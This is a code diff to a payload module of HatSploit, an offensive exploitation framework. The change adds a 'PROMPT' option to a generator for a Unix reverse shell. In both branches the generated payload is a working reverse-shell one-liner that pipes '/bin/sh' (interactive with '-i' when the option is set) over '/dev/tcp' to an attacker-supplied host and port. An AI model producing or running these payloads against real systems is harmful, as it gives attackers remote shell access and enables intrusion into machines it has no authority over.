@@ -52,14 +52,24 @@ class HatSploitPayload(HatSploitPayload):
             'Value': 8888,
             'Type': "port",
             'Required': True
+        },
+        'PROMPT': {
+            'Description': "Show shell prompt.",
+            'Value': "no",
+            'Type': "boolean",
+            'Required': False
         }
     }
 
     def generate(self):
-        local_host, local_port = self.parser.parse_options(self.options)
+        local_host, local_port, prompt = self.parser.parse_options(self.options)
 
         self.badges.output_process("Generating payload...")
-        payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"
+
+        if prompt in ['yes', 'y']:
+            payload = f"/bin/sh -i &>/dev/tcp/{local_host}/{local_port} 0>&1"
+        else:
+            payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"
 
         self.method['Payload'] = payload
         self.method['Instructions'] = payload
